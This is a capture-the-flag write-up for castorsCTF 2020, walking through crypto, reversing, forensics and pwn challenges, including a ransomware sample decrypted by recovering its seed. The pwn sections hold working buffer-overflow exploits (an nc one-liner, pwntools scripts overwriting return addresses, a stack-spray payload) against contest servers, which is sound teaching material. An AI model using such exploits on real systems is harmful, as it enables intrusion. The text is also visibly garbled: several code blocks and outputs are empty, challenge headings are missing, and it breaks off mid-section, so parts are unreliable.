##### Solution

I started reading it and noticed a few things which scared me `sbox` and
`hash`. `sbox` from what I remembered had something to do with cryptography and
[searching online](https://en.wikipedia.org/wiki/S-box) confirmed it.

I then started reading from where code was executed (skip the function
definitions).

```python
class TaskHandler(socketserver.BaseRequestHandler):
    def handle(self):
        self.request.sendall(BANNER)
        self.request.sendall(MESSAGE)
        challenge(self.request)

if __name__ == '__main__':
    socketserver.ThreadingTCPServer.allow_reuse_address = True
    server = socketserver.ThreadingTCPServer(('0.0.0.0', 8080), TaskHandler)
    server.serve_forever()
```

Is used to serve the challenge and seems unrelated to the problem. The `handle`
function sends the banner and a message and then calls the `challenge` function
which is where the core of the challenge seems to be located.

```python
    for n in range(20):
        secret, hashes, prices, highest = gen_hashes_and_prices()
        req.sendall(f"Price commitments for the week: {hashes}\n\n".encode())
        req.sendall(f"Monday AM Price: {prices['mon']['am']}\n".encode())
        req.sendall(f"(Week {n+1}) Enter day-time of highest price for the week: ".encode())
        inp = req.recv(256).strip().decode().lower()
        if inp != highest[0]:
            disp_prices(req, prices, secret)
            req.sendall(b"Try again next week.\n")
            exit(0)
        req.sendall(b'You got it!\n')
    else:
        req.sendall(f"Even Tom Nook is impressed. Here's your flag: {FLAG.decode()}".encode())
        exit(0)
```

The flag is sent in the else block which is reached when the for loop finishes
without being exited (with a `break` or like in this case with `exit`). This
means we must have `inp == highest[0]` 20 times consecutively. Each time
represents a "week".

We are given all hashes, the price on Monday at time "am" and are asked to enter
the time of the highest price in the week. All of these values are retrieved
from the function `gen_hashes_and_prices`.

```python
def gen_hashes_and_prices():
    d = {"mon": {"am": 0, "pm": 0},"tue": {"am": 0, "pm": 0},"wed": {"am": 0, "pm": 0},"thu": {"am": 0, "pm": 0},"fri": {"am": 0, "pm": 0},"sat": {"am": 0, "pm": 0}}
    secret = bytearray(urandom(16))
    seed(int.from_bytes(secret, 'big'))
    hashes = []
    highest = ('day-time', 0)
    for day in d.keys():
        for time in d[day].keys():
            price = d[day][time] = gen_price()
            hashes.append(hash(secret + "-".join([day, time, str(price)]).encode()))
            if price > highest[1]:
                highest = ("-".join([day, time]), price)
    return secret.hex(), " ".join(hashes), d, highest
```

The function `gen_hashes_and_prices` generates a `secret` using the function
`urandom()` from the module `os`. I assumed this function to generate
cryptographically random numbers (we can't guess the numbers it will generate
from previous numbers it generated) as I know `/dev/urandom` to be secure, and
in fact [the
documentation](https://docs.python.org/3/library/os.html#os.urandom) for it
confirms this is the case. It then sets the seed used by the python `random`
module, which means that if we know the value of `secret` we can possibly get
all the numbers generated, additionally the `random` module isn't
cryptographically secure which means that with enough numbers generated by it,
we can guess the next numbers.

The function then iterates over the days in the week from Monday to Saturday
(excluding Sunday), and for each iterates over the times "am" and "pm". For each
times (combination of day and time), it generates a price using the `gen_price`
function and then appends to the list `hashes`, the value returned by the
function `hash`, with as input a string made-up of the secret and the day of the
week, time and price. If the price generated is the highest seen so far,
`highest` is updated.

The `gen_price` function generates a price based on 2 calls to `randint`. This
means that knowing the price of Monday at time "am", means that we have one of
the number generated and an estimation of another one. Because the seed used by
the random function is updated each "week", it means that each "week" is
independent and we can't use data from previous weeks to solve the following
weeks.

I searched online to find how to predict numbers from the `random` module. I
found [a
post](https://crypto.stackexchange.com/questions/53811/is-it-possible-to-recover-the-seed-used-by-pythons-pseudo-random-number-generat)
the discusses it. However, the answers says that even with 40 generated numbers
it is not possible to reverse the state of the number generator. Considering
that for each week, only 24 numbers (2 per generated price, for 2 times for 6
days per week) are generated, it means that exploiting the `random` module seems
out of reach.

Next I looked at the `hash` function. It starts with an initial state and then
for each group of 16 bytes in the data, changes the state based on it.

At this point I was lost and didn't know what to do. A teammate, Uzay, who was
also looking at the challenge said that he managed to run it locally, and that
it allowed to print some stuff. I followed his suggestion and added a print
statement that prints the `state` in the `hash` function for each block of 16
bytes:

```python
    data = group(pad(data))
    for roundkey in data:
        print(state)
        for _ in range(round):
```

A file named `secret.py` with the following line also had to be added so that
the program could run:

```python
FLAG="testing_flag"
```

Once running this is what was printed on the server.py output when a client
connected:

```

```

For each time in the day, the state was the same. This is because the data is
processed in blocks of 16 bytes, and the first 16 bytes are the secret which is
the same for each day of the week. (Also note that in the output, every other
line is just the inital state). This means that if we were able to determine the
state after the first block was processed, we could brute force the different
possible prices and find the one that matched the hash we get from the server,
by manually performing the processing of the second block. My initial thought
was that maybe we could use some kind of "simultaneously" equation to determine
that state and decided to look at the `hash` function, to see whether that was
possible.

```python
def pad(s):
    if len(s) % 16 == 0:
        return s
    else:
        pad_b = 16 - len(s) % 16
        return s + bytes([pad_b]) * pad_b

def repeated_xor(p, k):
    return bytearray([p[i] ^ k[i] for i in range(len(p))])

def group(s):
    return [s[i * 16: (i + 1) * 16] for i in range(len(s) // 16)]

def hash(data):
    state = bytearray([165, 68, 114, 228, 151, 146, 106, 238, 198, 241, 198, 122, 46, 148, 3, 38])
    data = group(pad(data))
    for roundkey in data:
        for _ in range(round):
            state = repeated_xor(state, roundkey)
            for i in range(len(state)):
                state[i] = sbox[state[i]]
            temp = bytearray(16)
            for i in range(len(state)):
                temp[p[i]] = state[i]
            state = temp
    return state.hex()
```

Looking at the hash function in reverse, I noticed that the last 2 operations of
each round were reversible, they just 1. changed the order of the bytes 2.
changed the bytes using the Sbox which is also reversible. The only part that
isn't reversible is the `repeated_xor` operation which just XORs together its 2
parameters, the roundkey (i.e. a 16 bytes block of input data), and the current
state. This meant that in order to reverse it, we needed the input data which
was already what we were trying to get. This is when I realised we were given
the price on Monday at the "am" time, which meant that we could actually reverse
the hash function until we reached the common state shared by all the hashes
(i.e. the state when the hash function has only processed the secret).

So I started to write a script to do this.

```python

The `unrounds` function does the same thing as is done for each block in the
`hash` function of `server.py`, except it does it in reverse. This allows us to
retrieve the state that is common to all hashes. Then in the `find_highest`
function, I go through each time in each day (combination of day of week and
"am" or "pm"), and find by brute forcing which price is correct and get the
highest correct value. Once this is done, `find_highest` returns with the time
at which the price is highest and sends it to the server.

#### One Trick Pony (236 pts 116 solves)

##### Description

```
Author: hasu
nc chals20.cybercastors.com 14422
```

##### Solution

When you connect to the endpoint given, you get a prompt and when you type
something, you get what looks like a C-string literal (It's actually just a
python byte string but I didn't notice that when I first solved the challenge)
of the same length as your input.

```
$ nc chals20.cybercastors.com 14422

b'\x02\x12\x15'
> ^C
```

The name of the challenge "One Trick Pony", made me think of [one-time
pads](https://en.wikipedia.org/wiki/One-time_pad), so I thought of XOR-ing my
input with the output we're given:

```
$ nc chals20.cybercastors.com 14422

```

As I hadn't noticed it was a byte string and I'm generally prefer to use C for
byte manipulation I wrote a "script in C":

```c
#include <stdio.h>

	char a[] = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";

	for (int i = 0; i < 168; ++i) {
		putchar(a[i] ^ b[i]);
	}
}
```

[`reverse_me`](/assets/files/castorsCTF20/reverse_me)

##### Solution

Looking at the main function inside of ghidra gives the following:

![main](/assets/files/castorsCTF20/reverse_me_main.png)

As you can see, it reads the flag from `flag.txt` calls some functions on the
read flag, then prints the flag after those functions have been called.

If you connect to the given endpoint you can get those bytes:

```
$ nc chals20.cybercastors.com 14427
System Error...
Dumping memory...
64 35 68 35 64 37 33 7a 38 6b 33 37 6b 72 67 7a
Enter password: password
Wrong!
```

![FUN_0010096a](/assets/files/castorsCTF20/reverse_me_FUN_0010096a.png)
![add_2](/assets/files/castorsCTF20/reverse_me_add_2.png)
![FUN_001009c7](/assets/files/castorsCTF20/reverse_me_FUN_001009c7.png)

The function `FUN_0010096a` replaces the last newline (`\n`), with a null
terminator (`\0`). The function `add_2` (renamed by myself in ghidra), adds 2 to
each byte of the flag and the function `FUN_001009c7`, does some calculations on
the bytes based on the value of the byte.

We can then reverse those functions using z3 to get the flag:

```python
#!/usr/bin/env python3

from z3 import *

a = [0x64,0x35,0x68,0x35,0x64,0x37,0x33,0x7a,0x38,0x6b,0x33,0x37,0x6b,0x72,0x67,0x7a]
c = b = []

for x in range(16):
    b.append(Int(x))

s = Solver()
for (x, y) in zip(b, a):
    s.add(If(
        And(x > ord('`'), x < ord('{')),
        (x - 0x57) + ((x - 0x57) / 0x1a) * -0x1a + 0x61,
        x) + 2 == y)

s.check()
m = s.model()
sol = ""
for x in range(16):
    sol += chr(m[b[x]].as_long())
print(sol)
```

```
$ chmod +x solution.py
$ ./solution.py
r3v3r51n6y15yfun
```

I tried to submit the flag `castorsCTF{r3v3r51n6y15yfun}` but it didn't work.
So I tried reproducing the code in the `reverse_me` binary and realised that it
didn't work for the value `0x6b` (after processing), `y` in what I thought was
the flag:

```c
#include <stdio.h>

int main() {
	char a[] = {
		114,
		51,
		118,
		51,
		114,
		53,
		49,
		110,
		54,
		121,
		49,
		53,
		121,
		102,
		117,
		110,
		0};

	for (int i = 0; i < 16; ++i) {
		a[i] = a[i] + '\x02';
		if (('`' < a[i]) && (a[i] < '{')) {
			a[i] = (a[i] - 0x57) + ((a[i] - 0x57) / 0x1a) * -0x1a + 'a';
		}
		printf("%x ", a[i]);
	}
}
```

```
$ gcc process.c
$ ./a.out
64 35 68 35 64 37 33 7a 38 7b 33 37 7b 72 67 7a 
```

As you can see from the output, the `7b` should be `6b`. I realised that this is
where underscores would normally be placed and changed the `y`s to `_`s.

#### Mapping (484 points 30 solves)

##### Description

```
Author: Krekel

After wondering around lost in the dark, we finally found the map!
```

[`mapping`](/assets/files/castorsCTF20/mapping)

##### Solution

The binary provided a go one, because if you look at the end of the file using
text editor you can see Go function signatures:

```
$ xxd mapping | tail

00204ab0: 6169 6e00                                ain.
```

When executing it, it asks for a password and then says "Wrong!" when you enter
the wrong password:

```
$ ./mapping
Enter Password
hunter2
Wrong!
```

When I opened the binary inside of ghidra I couldn't really make sense of what
was going because go uses different calling conventions then those used by C and
C++. I searched online for go calling conventions and found [an
article](https://dr-knz.net/go-calling-convention-x86-64.html) that explained
them. Because of this I ditched ghidra for r2. Because arguments are passed on
the stack in go, you have the disable variable analysis in radare2: `e anal.vars
= false`. By reverse engineering I was able to understand that a mapping between
characters was created (with a hashmap), in the `main.createMappingTable`
function and that in the `main.apply` function, the mapping was applied to the
password given and it was then base64 encoded. Once those modifications had been
done the password was compared to the string
`eHpzdG9yc1hXQXtpYl80cjFuMmgxNDY1bl80MXloMF82Ml95MDQ0MHJfNGQxbl9iNXVyMn0=` which
after base64 decoding gave
`xzstorsXWA{ib_4r1n2h1465n_41yh0_62_y0440r_4d1n_b5ur2}`. I now had to reverse
engineer the mapping to understand how it worked and recover the flag. The way I
did it, is by sending a string containing all possible characters and then using
gdb see what they were getting transformed to. Using this information I was able
to make a script to decrypt the flag:

```python
#!/usr/bin/env python3

encrypted = "xzstorsXWA{ib_4r1n2h1465n_41yh0_62_y0440r_4d1n_b5ur2}"
sol = ""

#### Ransom (493 points 19 solves)

##### Description

Author: Krekel

Agent, we raided one the hideouts of a wanted cyber criminal. During the raid,
we extracted what appears to be a POC ransomware. It appears the he left a
picture for us, but it is encrypted. It is your task to reverse engineering this
sample and find out what secrets lie within the file. We managed to capture some
network traffic generated by the malware. Use it during your investigation.

We are counting on you.

[`flag.png`](/assets/files/castorsCTF20/flag.png)
[`ransom`](/assets/files/castorsCTF20/ransom)
[`traffic.pcapng`](/assets/files/castorsCTF20/traffic.pcapng)

##### Solution

This was another go binary to reverse engineer. From the files we were given, it
was already possible to guess that the `binary` had encrypted a file `flag.png`
and we now had the encrypted version of it. The pcap would probably contain a
key that was sent over the network and that would allow decryption. Looking at
the disassembly in confirmed this. The binary gets seeds from a server and then
sends back one of the seed which I assume was the actual seed used (I didn't
actually reverse engineer this part, to save time, as the worth case scenario of
that assumption was me have to do work I should have done anyway). The binary
then sets the seed used using
[`rand.Seed`](https://golang.org/pkg/math/rand/#Seed). The function
`main.encrypt` is then called. It opens the file `flag.png`, and then xors each
of the bytes with a random value from
[`rand.Intn(254)`](https://golang.org/pkg/math/rand/#Intn).


Because in the `.pcapng`, the seed sent to the server was `1337`, I wrote a
little go script that generated 1500 numbers with that seed, and then a python
script that xored the content of `flag.png` with those numbers:

```
POST /seed HTTP/1.1
Host: 192.168.0.2:8081
User-Agent: Go-http-client/1.1
Content-Length: 11
Content-Type: application/json
Accept-Encoding: gzip

{seed:1337}HTTP/1.0 200 OK
Content-Type: application/json
Content-Length: 5
Server: Werkzeug/1.0.1 Python/3.7.2
Date: Fri, 22 May 2020 22:47:50 GMT

"ok"
```

```go
package main

import (
	"fmt"
	"math/rand"
)

func main() {
	rand.Seed(1337)
	for i := 0; i < 1500; i++ {
		fmt.Println(rand.Intn(254))
	}
}
```

```python
#!/usr/bin/env python3

import sys
import struct

with open('./xor') as f:
    numbers = list(map(int, f.read().split()))

with open('./flag.png', 'rb') as f:
    bytes_image = f.read()

sol = []

for x, y in zip(bytes_image, numbers):
    sol.append(x ^ y)

sys.stdout.buffer.write(bytes(sol))
```

[`obfus`](/assets/files/castorsCTF20/obfus)

##### Solution

Opening the files in an editor, you can see that it has a `-----BEGIN
CERTIFICATE-----` header and `-----END CERTIFICATE-----` footer, because the
second to last line had the `=` padding from base64, I decided to base64 decode
the file (with the header and footer removed).

```
dC5pbml0AHR5cGUuLmVxLmZtdC5mbXQAbWFpbi5tYWluAA==
-----END CERTIFICATE-----
```

```
$ base64 -d no_headers
ELF>0E@base64: invalid input
```

For some reason it said "invalid input", however, I could already see that the
little that had been decoded started with `ELF` suggesting it was an elf file.
Looking at the `base64` man page, I noticed the `--ignore-garbage` option that
ignored non-alphabet characters. With this, I was able to decode the file and
execute it:

```
$ base64 -di no_headers > out
$ ./out
Estou procurando as palavras para falar em inglês ...
Aqui vou
[Y 2 F z d G 9 y c 0 N U R n t X a D B f c z Q x Z F 9 B b l k 3 a G x u R 1 9 C M H V U X 2 0 0 d E h 9]
```

The message translated (from Portuguese to English) was:

```
I'm looking for the words to speak in English ...
Here you go
```

Because this was a reversing challenge, I opened it in `radare2` but couldn't
find anything, the binary was just loading the text it was printing from memory
and nothing else, I then realised the string outputted might be encrypted, and
it turns out that it is base64.

```
$ base64 -d <<< Y2FzdG9yc0NURntXaDBfczQxZF9Bblk3aGxuR19CMHVUX200dEh9

One of our clients sent us the password but we got this instead. He insists the
password is in the image, can you help us?

[pooh.jpg](/assets/files/castorsCTF20/pooh.jpg)

##### Solution

When opening the file, it looked like a hexdump, possibly one created using the
tool `xxd`. The first line looked like the hexdump of a `jpg`, as it contains
the string `Exif`.

```
00000010: 012c 0000 ffe1 20e8 4578 6966 0000 4949  .,.... .Exif..II
```

The last line of the hexdump looked as if it should have been the first line, as
it had the offset `00000000` and also contained the magic bytes of a jpeg:

```
0000ccc0: f85d 21b1 ffd9                           .]!...
00000000: ffd8 ffe0 0010 4a46 4946 0001 0101 012c  ......JFIF.....,
```

I moved the last line to the beginning:

```
00000000: ffd8 ffe0 0010 4a46 4946 0001 0101 012c  ......JFIF.....,
00000010: 012c 0000 ffe1 20e8 4578 6966 0000 4949  .,.... .Exif..II
```

And then used `xxd -r pooh.jpg correct.jpg` to convert from the hexdump back
into a "binary" file.

##### Solution

Decompiling the program in ghidra gives the following main function:

```c
undefined8 main(void)

{
  int iVar1;
  char local_118 [256];
  char local_18 [16];
  
  printf("Hello everyone, say your name: ");
  gets(local_118);
  iVar1 = strcmp("CyberCastors",local_18);
  if (iVar1 == 0) {
    get_flag();
  }
  puts("You lose!");
  return 0;
}
```

For the `get_flag` function to run (which will print the flag), we must have the
char array `local_18`, be equal to `CyberCastors`. This can be done by
exploiting the use of the `gets` function.

```
$ python -c 'print("A" * 256 + "CyberCastors")' | nc chals20.cybercastors.com 14424
Hello everyone, say your name: castorsCTF{b0f_4r3_n0t_th4t_h4rd_or_4r3_th3y?}

##### Solution

Redirect using a buffer overflow the execution to the function `get_flag`
located at address `0x004006e7`.

To find the location of the return pointer, I used gdb with the `cyclic` program
distributed with `pwntools`.

I then a little `pwntools` script to get the flag:

```
from pwn import *

GET_FLAG = 0x004006e7

#r = process("./babybof")
r = remote('chals20.cybercastors.com', 14425)

r.sendline(b"A" * 264 + p64(GET_FLAG))
r.interactive()
```

[`winners`](/assets/files/castorsCTF20/winners)

##### Solution

The solution for this is similar to babybof1 except that the equivalent of the
flag function has checks. I initially thought of bypassing these checks by just
jumping inside of the `winnersLevel` function (the function that prints the flag
(equivalent to `get_flag` in babybof1), after the checks. However this didn't
work because of the way the value is gotten from the stack.

To fix this I "sprayed" the stack with the value that is wanted by the
`winnersLevel` function hoping that it would find the value there which it did:

```python
#!/usr/bin/env python3

from pwn import *

#r = process('./winners')
r = remote('chals20.cybercastors.com', 14434)

payload = b"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaa"
#payload = b"A" * 76
payload += p32(0x08049196)
payload += p32(0x182)
payload += p32(0x182)
payload += p32(0x182)
payload += p32(0x182)
r.sendline(payload)
#attach(r)
r.recv()
r.interactive()
```

  char local_118 [264];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  __stream = fopen("flag.txt","r");
  if (__stream == (FILE *)0x0) {
                    // WARNING: Subroutine does not return
    exit(1);
  }
  __isoc99_fscanf(__stream,"%s",local_218);
  fclose(__stream);
  printf("Hello everyone, this is babyfmt! say something: ");
  fgets(local_118,0xff,stdin);
  printf(local_118);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    // WARNING: Subroutine does not return
    __stack_chk_fail();
  }
  return 0;
}
```

As you can see, it loads the flag into memory on the stack. This means that we
can exploit the format string vulnerability later in the program to get the
flag:
